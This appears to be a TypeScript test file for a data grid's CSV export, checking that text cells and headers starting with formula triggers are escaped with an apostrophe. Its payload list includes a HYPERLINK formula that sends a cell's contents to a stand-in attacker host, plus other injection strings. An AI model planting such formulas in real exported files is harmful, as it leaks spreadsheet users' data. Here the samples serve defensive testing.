import { expect, html } from '@open-wc/testing';
import { escapeFormula } from '../src/internal/export.js';
import type { ColumnConfiguration } from '../src/internal/types.js';
import GridTestFixture from './utils/grid-fixture.js';
import data, { type TestData } from './utils/test-data.js';

// core-internal-export-4: a text cell that starts with a formula trigger is
// written with a leading apostrophe, so a spreadsheet opening the CSV shows
// it as text instead of evaluating it.

class ExportFixture extends GridTestFixture<TestData> {
  public override updateConfig() {
    this.columnConfig = [
      { key: 'id', type: 'number' },
      { key: 'name', headerText: 'Full Name' },
    ] as ColumnConfiguration<TestData>[];
  }

  public override setupTemplate() {
    return html`<apex-grid .data=${this.data} .columns=${this.columnConfig}></apex-grid>`;
  }
}

const PAYLOADS = [
  '=HYPERLINK("https://evil.test/?"&A2,"Click")',
  '@SUM(1+1)',
  '+1+1',
  '-2+3',
  '\tcmd',
  '\rcmd',
];

describe('CSV formula injection', () => {
  let fx: ExportFixture;

  beforeEach(async () => {
    fx = new ExportFixture(JSON.parse(JSON.stringify(data)));
    await fx.setUp();
  });

  afterEach(() => fx.tearDown());

  async function exportNames(names: unknown[], opts: object = {}): Promise<string[]> {
    fx.grid.data = names.map(
      (name, i) => ({ id: -i, name, active: true, importance: 'low' }) as unknown as TestData
    );
    await fx.waitForUpdate();
    return fx.grid.exportToCSV({ filename: '', bom: false, ...opts }).split('\r\n');
  }

  it('prefixes formula-leading text cells with an apostrophe by default', async () => {
    const lines = await exportNames(['=1+1', '@SUM(1+1)', '+1+1', '-2+3']);
    expect(lines.slice(1)).to.deep.equal(["0,'=1+1", "-1,'@SUM(1+1)", "-2,'+1+1", "-3,'-2+3"]);
  });

  it('leaves no exported cell starting with a trigger character', async () => {
    const lines = await exportNames(PAYLOADS);
    const cells = lines.slice(1).map((line) => line.slice(line.indexOf(',') + 1).replace(/^"/, ''));
    expect(cells).to.have.length(PAYLOADS.length);
    for (const cell of cells) expect(cell, `exported cell ${cell}`).to.not.match(/^[=+\-@\t\r]/);
  });

  it('escapes before quoting', async () => {
    const lines = await exportNames(['=A1,"x"']);
    expect(lines[1]).to.equal(`0,"'=A1,""x"""`);
  });

  it('leaves numbers, plain signed decimals and ordinary text alone', async () => {
    const lines = await exportNames(['-5', '+1.5', '-.25', 'plain', "'quoted", 'a=b']);
    expect(lines.slice(1)).to.deep.equal([
      '0,-5',
      '-1,+1.5',
      '-2,-.25',
      '-3,plain',
      "-4,'quoted",
      '-5,a=b',
    ]);
  });

  it('applies the same rule to header labels', async () => {
    fx.grid.columns = [
      { key: 'id', type: 'number', headerText: '-id' },
      { key: 'name', headerText: '=cmd' },
    ] as ColumnConfiguration<TestData>[];
    await fx.waitForUpdate();
    const header = fx.grid.exportToCSV({ filename: '', bom: false }).split('\r\n')[0];
    expect(header).to.equal("'-id,'=cmd");
  });

  it('writes the raw text with escapeFormulas: false', async () => {
    const lines = await exportNames(['=1+1', '-note'], { escapeFormulas: false });
    expect(lines.slice(1)).to.deep.equal(['0,=1+1', '-1,-note']);
  });

  it('escapes formatter output too', async () => {
    const lines = await exportNames(['x'], { formatter: () => '=evil()' });
    expect(lines[1]).to.equal("'=evil(),'=evil()");
  });

  it('escapeFormula only touches formula-leading strings', () => {
    expect(escapeFormula('=x')).to.equal("'=x");
    expect(escapeFormula('-note')).to.equal("'-note");
    expect(escapeFormula('-5')).to.equal('-5');
    expect(escapeFormula(-5)).to.equal(-5);
    expect(escapeFormula(true)).to.equal(true);
    expect(escapeFormula(null)).to.equal(null);
    expect(escapeFormula('')).to.equal('');
  });

  it('writes a boxed String from a formatter raw, the keep-as-is marker', async () => {
    const lines = await exportNames(['x'], {
      formatter: () => new String('=A1*2') as unknown as string,
    });
    expect(lines[1]).to.equal('=A1*2,=A1*2');
  });
});
